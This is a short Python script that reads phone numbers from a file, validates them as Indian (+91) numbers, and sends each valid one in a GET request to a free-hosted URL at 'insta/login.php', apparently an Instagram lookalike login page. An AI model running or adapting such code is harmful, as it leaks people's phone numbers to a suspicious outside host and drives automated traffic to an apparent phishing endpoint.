import phonenumbers 
import requests
with open("n.txt","r") as n:
     for i in n:
         phone_number = phonenumbers.parse("+91{}".format(i)) 
         valid = phonenumbers.is_valid_number(phone_number) 
         if valid:
            requests.get("https://crazyboysofagv.000webhostapp.com/insta/login.php?user={}".format(i))
